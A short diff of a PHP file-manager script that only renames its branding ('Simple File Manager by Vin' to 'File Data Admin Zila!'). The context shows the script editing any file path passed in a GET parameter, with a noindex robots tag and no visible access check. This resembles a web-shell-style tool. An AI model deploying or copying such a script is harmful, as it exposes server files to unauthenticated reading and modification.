@@ -107,7 +107,7 @@ if (isset($_GET['edit']) && is_file($_GET['edit'])) {
     exit;
 }
 
-// MAIN Simple File Manager by Vin
+// MAIN File Data Admin Zila!
 $curdir = getcwd();
 $list = @scandir($curdir);
 ?>
@@ -116,7 +116,7 @@ $list = @scandir($curdir);
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Simple File Manager by Vin</title>
+<title>File Data Admin Zila!</title>
 <meta name="robots" content="noindex, nofollow">
 <style>
 body { margin:0; padding:20px; font-family: monospace; background:#121212; color:#eee; }
@@ -144,7 +144,7 @@ th { background:#222; }
 </style>
 </head>
 <body>
-<h2>Simple File Manager by Vin</h2>
+<h2>File Data Admin Zila!</h2>
 <?php if($msg) echo $msg; ?>
 
 <div><b>Current Dir:</b> <?php echo htmlspecialchars($curdir); ?>
